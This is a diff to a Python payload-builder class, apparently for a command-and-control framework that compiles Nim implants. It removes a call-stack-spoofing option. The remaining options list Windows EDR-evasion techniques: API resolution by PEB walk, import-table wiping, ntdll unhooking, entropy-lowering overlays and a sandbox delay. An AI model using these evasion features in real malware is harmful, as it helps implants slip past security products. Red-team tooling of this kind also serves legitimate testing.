@@ -242,11 +242,10 @@ class Poopsie(PayloadType):
                 "dfr: Dynamic Function Resolution via PEB walk (sensitive APIs resolved at runtime, not in IAT). "
                 "iat_obf: Wipe import directory in memory. "
                 "unhook_ntdll: Remap clean ntdll from disk. "
-                "stack_spoof: Spoof call stack frames before API calls (defeats EDR stack walking). "
                 "entropy: Append English-text overlay to lower binary entropy (defeats ML entropy analysis)."
             ),
             default_value=[],
-            choices=["dfr", "iat_obf", "unhook_ntdll", "stack_spoof", "entropy"],
+            choices=["dfr", "iat_obf", "unhook_ntdll", "entropy"],
             required=False,
             group_name="Evasion Options",
             supported_os=["Windows"],
@@ -998,18 +997,14 @@ class Poopsie(PayloadType):
             if selected_os == "Windows" and evasion_options:
                 # Evasion features use x86/x64 inline asm — skip on ARM64
                 if architecture == "arm64":
-                    skipped_evasions = [e for e in evasion_options if e in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls", "stack_spoof"}]
-                    evasion_options = [e for e in evasion_options if e not in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls", "stack_spoof"}]
+                    skipped_evasions = [e for e in evasion_options if e in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls"}]
+                    evasion_options = [e for e in evasion_options if e not in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls"}]
                     if skipped_evasions:
                         build_messages.append(f"Evasion skipped (unsupported on ARM64): {', '.join(skipped_evasions)}")
                 if evasion_options:
                     for evasion in evasion_options:
                         nim_args.append(f"-d:evasion_{evasion}")
                     build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
-                    if "stack_spoof" in evasion_options:
-                        # LTO is incompatible with inline asm used in stack spoofing
-                        nim_args = [a for a in nim_args if a not in ("--passC:-flto", "--passL:-flto")]
-                        build_messages.append("  LTO disabled (incompatible with stack spoof inline asm)")
 
             sandbox_delay = self.get_parameter("sandbox_evasion") or "0"
             try:
